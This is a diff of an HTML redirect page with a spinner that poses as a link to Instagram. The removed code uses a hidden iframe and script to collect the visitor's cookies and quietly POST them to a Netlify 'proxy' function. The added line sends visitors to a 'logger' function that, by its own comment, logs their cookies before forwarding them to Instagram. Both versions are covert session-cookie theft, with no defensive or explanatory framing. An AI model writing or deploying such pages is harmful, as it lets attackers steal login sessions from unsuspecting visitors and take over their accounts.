@@ -29,12 +29,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* Hidden iframe to load Instagram and set cookies */
-        #ig-frame {
-            display: none;
-            width: 0;
-            height: 0;
-        }
     </style>
 </head>
 <body>
@@ -42,83 +36,9 @@
         <div class="spinner"></div>
     </div>
 
-    <!-- Hidden iframe to force Instagram to set all its cookies -->
-    <iframe id="ig-frame" src="https://www.instagram.com/"></iframe>
-
     <script>
-        // Wait for the iframe to load
-        const iframe = document.getElementById('ig-frame');
-        
-        iframe.onload = function() {
-            try {
-                // Get all cookies from the iframe's domain
-                // This ensures we capture cookies set by Instagram's JS
-                const iframeCookies = iframe.contentDocument.cookie;
-                
-                // Also get any cookies from the main window (in case some were set before)
-                const mainCookies = document.cookie;
-                
-                // Combine them (deduplicate by name)
-                const allCookies = combineCookies(mainCookies, iframeCookies);
-
-                // Send to Netlify function
-                fetch('/.netlify/functions/proxy', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        cookies: allCookies,
-                        timestamp: new Date().toISOString()
-                    }),
-                    keepalive: true
-                }).catch(err => console.log("Logger failed silently", err));
-
-            } catch (e) {
-                // Fallback: just send main cookies if cross-origin issues occur
-                fetch('/.netlify/functions/proxy', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        cookies: document.cookie,
-                        timestamp: new Date().toISOString()
-                    }),
-                    keepalive: true
-                }).catch(err => console.log("Logger fallback failed", err));
-            } finally {
-                // Redirect user to Instagram
-                window.location.href = "https://www.instagram.com/";
-            }
-        };
-
-        // Function to combine and deduplicate cookies
-        function combineCookies(c1, c2) {
-            const map = new Map();
-            const parse = (str) => {
-                if (!str) return;
-                str.split(';').forEach(pair => {
-                    const [key, ...val] = pair.trim().split('=');
-                    if (key && val.length) {
-                        map.set(key, val.join('='));
-                    }
-                });
-            };
-            parse(c1);
-            parse(c2);
-            let result = [];
-            map.forEach((val, key) => {
-                result.push(`${key}=${val}`);
-            });
-            return result.join('; ');
-        }
-
-        // Fallback if iframe doesn't load in 2 seconds
-        setTimeout(() => {
-            // Redirect anyway
-            window.location.href = "https://www.instagram.com/";
-        }, 2000);
+        // Redirect to the logger function, which will log cookies and redirect to Instagram
+        window.location.href = "/.netlify/functions/logger";
     </script>
 </body>
 </html>
